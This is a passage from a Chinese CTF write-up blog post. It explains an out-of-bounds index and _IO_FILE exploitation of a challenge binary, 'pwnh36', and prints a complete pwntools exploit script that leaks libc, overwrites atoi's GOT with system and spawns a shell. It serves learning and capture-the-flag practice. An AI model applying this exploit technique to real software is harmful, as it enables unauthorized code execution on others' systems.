+<p>所有指针都设置为_IO_buf_base的值，使得_IO_write_end - _IO_write_ptr &#x3D;&#x3D; 0，不满足_IO_write_ptr小于等于_IO_write_end，fwrite时，就不会写入数据。而我们向下偏移一些地址，然后我们用WizardSpell(-2,’x00’)操作，可以让_IO_write_ptr -&#x3D; 49</p>
+<p>现在，我们就操作一下，让_IO_write_ptr指向atoi的GOT</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  </span></span><br><span class="line">WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>)  </span><br><span class="line">WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>**[注意，每次操作，_IO_write_ptr指向了新地方，如果这个地方的数据是有用的，不要破坏它，因此’x00’，’x00’<em>3这些都是我调试后确定的，具体也可以动手调试看看。]{.mark}</em>*</p>
+<p>现在，_IO_write_ptr指向了atoi的GOT-1处，我们就可以修改atoi的GOT为system地址，拿shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> + p64(system_addr)  </span><br><span class="line">WizardSpell(<span class="number">0</span>,payload)  </span><br><span class="line"><span class="comment">#getshell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;sh&#x27;</span>)  </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">综上，我们的exp脚本</span><br><span class="line"></span><br><span class="line">```Python</span><br><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./pwnh36&#x27;</span>)  </span><br><span class="line"><span class="comment">#sh = remote(&#x27;111.198.29.45&#x27;,41210)  </span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwnh36&#x27;</span>)  </span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]  </span><br><span class="line">log_addr = elf.symbols[<span class="string">&#x27;log_file&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&quot;Give me the wizard&#x27;s name:&quot;</span>,<span class="string">&quot;seaase&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">WizardSpell</span>(<span class="params">index,content</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Who will spell:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Spell name:&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#这两步是为了初始化FILE的结构体  </span></span><br><span class="line">create()  </span><br><span class="line">WizardSpell(<span class="number">0</span>,<span class="string">&#x27;seaase&#x27;</span>)  </span><br><span class="line"><span class="comment">#修改log_file结构体的_IO_write_base  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):  </span><br><span class="line">   <span class="comment">#_IO_write_base = _IO_write_base + 1 - 50  </span></span><br><span class="line">   WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#在不影响log_file结构体的情况下，我们抬升_IO_write_base 13个字节，然后再-=50  </span></span><br><span class="line">WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">13</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):  </span><br><span class="line">   <span class="comment">#_IO_write_base = _IO_write_base + 1 - 50  </span></span><br><span class="line">   WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#在不影响log_file结构体的情况下，我们抬升_IO_write_base 9个字节，然后再-=50  </span></span><br><span class="line">WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">9</span>)  </span><br><span class="line">WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#现在，_IO_write_base指向了log_file的结构体附近处，我们可以修改log_file的结构体了  </span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0x231</span>)  </span><br><span class="line"><span class="comment">#flags  </span></span><br><span class="line">payload += p64(<span class="number">0xFBAD24A8</span>)  </span><br><span class="line">WizardSpell(<span class="number">0</span>,payload)  </span><br><span class="line"><span class="comment">#_IO_read_ptr  _IO_read_end  </span></span><br><span class="line">payload = p64(atoi_got) + p64(atoi_got+<span class="number">0x100</span>)  </span><br><span class="line">WizardSpell(<span class="number">0</span>,payload)  </span><br><span class="line">atoi_addr = u64(sh.recv(<span class="number">8</span>))  </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(atoi_addr)  </span><br><span class="line">  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr)  </span><br><span class="line">libc_base = atoi_addr - libc.dump(<span class="string">&#x27;atoi&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#回到之前的位置  </span></span><br><span class="line">WizardSpell(-<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0</span>))  </span><br><span class="line"><span class="comment">#重新写  </span></span><br><span class="line">WizardSpell(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0x231</span>) + p64(<span class="number">0xfbad24a8</span>))  </span><br><span class="line"><span class="comment">#需要_IO_read_ptr大于等于_IO_read_end，经过调试，发现输出以后，发现0x50正好  </span></span><br><span class="line">WizardSpell(<span class="number">0</span>, p64(log_addr) + p64(log_addr + <span class="number">0x50</span>) + p64(log_addr))  </span><br><span class="line"><span class="comment">#泄露log_file结构体的地址  </span></span><br><span class="line">heap_addr = u64(sh.recvn(<span class="number">8</span>)) - <span class="number">0x10</span>  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap addr:&#x27;</span>,<span class="built_in">hex</span>(heap_addr)  </span><br><span class="line">  </span><br><span class="line">WizardSpell(<span class="number">0</span>,p64(heap_addr + <span class="number">0x100</span>)*<span class="number">3</span>)  </span><br><span class="line"><span class="comment">#覆盖_IO_buf_base和_IO_buf_end  </span></span><br><span class="line"><span class="comment">#然后程序中执行fread就会修改_IO_write_ptr为_IO_buf_base  </span></span><br><span class="line">WizardSpell(<span class="number">0</span>,p64(atoi_got+<span class="number">0x78</span> + <span class="number">23</span>) + p64(atoi_got + <span class="number">0xA00</span>))  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#  </span></span><br><span class="line">WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>)  </span><br><span class="line">WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>)  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> + p64(system_addr)  </span><br><span class="line">WizardSpell(<span class="number">0</span>,payload)  </span><br><span class="line"><span class="comment">#getshell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/%E4%B8%8B%E6%A0%87%E8%B6%8A%E7%95%8C/" rel="tag"># 下标越界</a>
+              <a href="/ha1vk/tags/IO-FILE/" rel="tag"># IO FILE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/10/secret_file/" rel="prev" title="secret_file">
+      <i class="fa fa-chevron-left"></i> secret_file
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/10/note-service2/" rel="next" title="note-service2">
+      note-service2 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
